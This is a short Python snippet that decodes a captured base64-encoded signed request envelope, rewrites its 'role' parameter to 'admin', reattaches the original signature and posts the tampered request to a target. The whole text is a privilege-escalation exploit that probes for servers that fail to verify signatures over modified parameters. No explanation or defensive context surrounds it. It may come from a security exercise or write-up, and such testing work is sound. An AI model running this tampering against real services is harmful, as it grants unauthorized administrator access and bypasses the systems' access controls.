import base64
import json
import requests

envelope = json.loads(base64.b64decode(captured))
params = envelope["params"]
params["role"] = "admin"
payload = {"params": params, "signature": envelope["signature"]}
encoded = base64.b64encode(json.dumps(payload).encode()).decode()
requests.post(target, json={"request": encoded})
